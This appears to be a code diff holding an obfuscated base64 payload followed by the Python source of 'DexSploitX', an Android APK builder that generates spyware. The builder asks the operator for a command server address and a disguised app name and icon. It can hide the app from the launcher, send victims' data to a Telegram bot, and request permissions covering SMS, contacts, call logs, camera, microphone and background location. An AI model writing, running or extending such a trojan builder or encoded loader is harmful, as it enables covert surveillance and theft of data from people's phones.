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'))))
+"""
+DexSploitX Ultimate APK Builder
+Uses apktool to modify decompiled APK, rebuild, and sign
+"""
+
+import os
+import sys
+import subprocess
+import shutil
+import re
+import tempfile
+import json
+from pathlib import Path
+from datetime import datetime
+
+try:
+    from PIL import Image
+    PIL_AVAILABLE = True
+except ImportError:
+    PIL_AVAILABLE = False
+
+class Colors:
+    CYAN = '\033[96m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
+    END = '\033[0m'
+    BOLD = '\033[1m'
+
+class DexSploitXBuilder:
+    def __init__(self):
+        self.banner = f"""
+{Colors.CYAN}╔═══════════════════════════════════════════════════════════╗
+║        {Colors.RED}██████╗ ███████╗██╗  ██╗███████╗██████╗ {Colors.CYAN}        ║
+║        {Colors.RED}██╔══██╗██╔════╝╚██╗██╔╝██╔════╝██╔══██╗{Colors.CYAN}        ║
+║        {Colors.RED}██║  ██║█████╗   ╚███╔╝ ███████╗██████╔╝{Colors.CYAN}        ║
+║        {Colors.RED}██║  ██║██╔══╝   ██╔██╗ ╚════██║██╔═══╝ {Colors.CYAN}        ║
+║        {Colors.RED}██████╔╝███████╗██╔╝ ██╗███████║██║     {Colors.CYAN}        ║
+║        {Colors.RED}╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝     {Colors.CYAN}        ║
+║                                                           ║
+║          {Colors.YELLOW}Ultimate APK Builder v4.0{Colors.CYAN}                   ║
+║          {Colors.GREEN}Supports Android 5.0 - 16 (API 21-36){Colors.CYAN}       ║
+║                                                           ║
+║          {Colors.BOLD}Developed by: {Colors.YELLOW}NIGHTKING{Colors.CYAN}                    ║
+║          {Colors.BOLD}GitHub: {Colors.YELLOW}https://github.com/offsecnight{Colors.CYAN}    ║
+╚═══════════════════════════════════════════════════════════╝{Colors.END}
+
+{Colors.YELLOW}[!] FOR AUTHORIZED SECURITY TESTING ONLY{Colors.END}
+"""
+        
+        self.base_dir = Path(__file__).parent
+        self.stub_dir = self.base_dir / "stub"  # Original stub (never modified)
+        self.work_dir = None  # Temporary working directory
+        self.apktool_jar = self.base_dir / "apktool.jar"
+        self.keystore_path = self.base_dir.parent / "keystore" / "keystore"
+        self.output_dir = self.base_dir.parent / "APK"
+        self.config_json_path = self.base_dir.parent / "config.json"
+        self.config = {}
+        
+    def print_banner(self):
+        print(self.banner)
+    
+    def check_requirements(self):
+        """Check required tools"""
+        print(f"{Colors.CYAN}[*] Checking requirements...{Colors.END}")
+        
+        # Check Java
+        try:
+            subprocess.run(['java', '-version'], capture_output=True, check=True)
+            print(f"{Colors.GREEN}[✓] Java found{Colors.END}")
+        except:
+            print(f"{Colors.RED}[✗] Java not found{Colors.END}")
+            return False
+        
+        # Check PIL/Pillow
+        if PIL_AVAILABLE:
+            print(f"{Colors.GREEN}[✓] Pillow found{Colors.END}")
+        else:
+            print(f"{Colors.YELLOW}[!] Pillow not found - icon change disabled{Colors.END}")
+            print(f"{Colors.YELLOW}[!] Install: pip install Pillow{Colors.END}")
+        
+        # Check apktool
+        if not self.apktool_jar.exists():
+            print(f"{Colors.RED}[✗] apktool.jar not found{Colors.END}")
+            return False
+        print(f"{Colors.GREEN}[✓] apktool.jar found{Colors.END}")
+        
+        # Check stub
+        if not self.stub_dir.exists():
+            print(f"{Colors.RED}[✗] stub folder not found{Colors.END}")
+            return False
+        print(f"{Colors.GREEN}[✓] Stub APK found{Colors.END}")
+        
+        # Check keystore
+        if not self.keystore_path.exists():
+            print(f"{Colors.YELLOW}[!] Keystore not found, will create{Colors.END}")
+        else:
+            print(f"{Colors.GREEN}[✓] Keystore found{Colors.END}")
+        
+        print()
+        return True
+    
+    def create_working_directory(self):
+        """Create temporary working directory and copy stub"""
+        print(f"{Colors.CYAN}[*] Preparing build environment...{Colors.END}", end='', flush=True)
+        
+        try:
+            # Create temp directory
+            temp_base = self.base_dir / "temp"
+            temp_base.mkdir(exist_ok=True)
+            
+            # Create unique work directory
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            self.work_dir = temp_base / f"build_{timestamp}"
+            
+            # Copy stub to work directory
+            shutil.copytree(self.stub_dir, self.work_dir)
+            
+            print(f"\r{Colors.GREEN}[✓] Build environment ready{Colors.END}" + " " * 30)
+            return True
+            
+        except Exception as e:
+            print(f"\r{Colors.RED}[✗] Failed to create working directory: {e}{Colors.END}")
+            return False
+    
+    def cleanup_working_directory(self):
+        """Delete temporary working directory"""
+        if self.work_dir and self.work_dir.exists():
+            try:
+                shutil.rmtree(self.work_dir)
+            except Exception as e:
+                pass
+    
+    def get_config(self):
+        """Get build configuration"""
+        print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}")
+        print(f"{Colors.BOLD}{Colors.CYAN}                  CONFIGURATION                            {Colors.END}")
+        print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}\n")
+        
+        # Server IP
+        self.config['ip'] = input(f"{Colors.YELLOW}[?] Server IP: {Colors.END}").strip()
+        
+        # Server Port
+        self.config['port'] = input(f"{Colors.YELLOW}[?] Server Port (default: 8080): {Colors.END}").strip() or "8080"
+        
+        # App Name
+        self.config['app_name'] = input(f"{Colors.YELLOW}[?] App Name (default: System Service): {Colors.END}").strip() or "System Service"
+        
+        # Package Name
+        self.config['package'] = input(f"{Colors.YELLOW}[?] Package (default: com.system.service): {Colors.END}").strip() or "com.system.service"
+        
+        # Website
+        self.config['website'] = input(f"{Colors.YELLOW}[?] Website URL (default: https://www.android.com): {Colors.END}").strip() or "https://www.android.com"
+        
+        # Icon
+        default_icon = self.base_dir / "facebook.png"
+        icon_prompt = f"{Colors.YELLOW}[?] Icon path (default: facebook.png): {Colors.END}"
+        icon_path = input(icon_prompt).strip()
+        
+        if not icon_path:
+            icon_path = str(default_icon)
+        
+        icon_file = Path(icon_path)
+        if icon_file.exists():
+            self.config['icon'] = icon_file
+            print(f"{Colors.GREEN}[✓] Icon will be changed: {icon_file.name}{Colors.END}")
+        else:
+            self.config['icon'] = None
+            print(f"{Colors.YELLOW}[!] Icon not found, using default{Colors.END}")
+        
+        # Telegram Configuration
+        print(f"\n{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}")
+        print(f"{Colors.BOLD}{Colors.CYAN}           TELEGRAM AUTO-DUMP CONFIGURATION                {Colors.END}")
+        print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}\n")
+        
+        print(f"{Colors.YELLOW}Configure Telegram to auto-dump data from both APK and Server{Colors.END}")
+        telegram_choice = input(f"{Colors.YELLOW}[?] Enable Telegram auto-dump? (y/n, default: n): {Colors.END}").strip().lower()
+        
+        if telegram_choice == 'y':
+            bot_token = input(f"{Colors.YELLOW}[?] Telegram Bot Token: {Colors.END}").strip()
+            chat_id = input(f"{Colors.YELLOW}[?] Telegram Chat ID: {Colors.END}").strip()
+            
+            if bot_token and chat_id:
+                self.config['telegram_bot_token'] = bot_token
+                self.config['telegram_chat_id'] = chat_id
+                print(f"{Colors.GREEN}[✓] Telegram configured: {bot_token[:20]}...{Colors.END}")
+                print(f"{Colors.GREEN}[✓] Chat ID: {chat_id}{Colors.END}")
+                print(f"{Colors.GREEN}[✓] Data will auto-dump to Telegram from APK and Server{Colors.END}")
+            else:
+                self.config['telegram_bot_token'] = ""
+                self.config['telegram_chat_id'] = ""
+                print(f"{Colors.YELLOW}[!] Telegram not configured (skipped){Colors.END}")
+        else:
+            self.config['telegram_bot_token'] = ""
+            self.config['telegram_chat_id'] = ""
+            print(f"{Colors.YELLOW}[!] Telegram auto-dump disabled{Colors.END}")
+        
+        # Hide App Option
+        print(f"\n{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}")
+        print(f"{Colors.BOLD}{Colors.CYAN}              APP VISIBILITY                               {Colors.END}")
+        print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}\n")
+        
+        hide_choice = input(f"{Colors.YELLOW}[?] Hide app from launcher? (y/n, default: n): {Colors.END}").strip().lower()
+        self.config['hide_app'] = (hide_choice == 'y')
+        
+        if self.config['hide_app']:
+            print(f"{Colors.GREEN}[✓] App will be hidden from launcher{Colors.END}")
+        else:
+            print(f"{Colors.GREEN}[✓] App will be visible in launcher{Colors.END}")
+        
+        # Permissions Selection
+        print(f"\n{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}")
+        print(f"{Colors.BOLD}{Colors.CYAN}              PERMISSION SELECTION                         {Colors.END}")
+        print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}\n")
+        
+        print(f"{Colors.YELLOW}Select permissions to include (y/n for each):{Colors.END}\n")
+        
+        # Define available permissions with descriptions
+        available_permissions = {
+            'READ_CONTACTS': ('android.permission.READ_CONTACTS', 'Access contacts'),
+            'READ_PHONE_STATE': ('android.permission.READ_PHONE_STATE', 'Read phone state'),
+            'READ_CALL_LOG': ('android.permission.READ_CALL_LOG', 'Access call logs'),
+            'READ_SMS': ('android.permission.READ_SMS', 'Read SMS messages'),
+            'RECEIVE_SMS': ('android.permission.RECEIVE_SMS', 'Receive SMS'),
+            'CAMERA': ('android.permission.CAMERA', 'Access camera'),
+            'RECORD_AUDIO': ('android.permission.RECORD_AUDIO', 'Record audio'),
+            'ACCESS_FINE_LOCATION': ('android.permission.ACCESS_FINE_LOCATION', 'Precise location'),
+            'ACCESS_COARSE_LOCATION': ('android.permission.ACCESS_COARSE_LOCATION', 'Approximate location'),
+            'ACCESS_BACKGROUND_LOCATION': ('android.permission.ACCESS_BACKGROUND_LOCATION', 'Background location'),
+            'READ_EXTERNAL_STORAGE': ('android.permission.READ_EXTERNAL_STORAGE', 'Read storage'),
+            'WRITE_EXTERNAL_STORAGE': ('android.permission.WRITE_EXTERNAL_STORAGE', 'Write storage'),
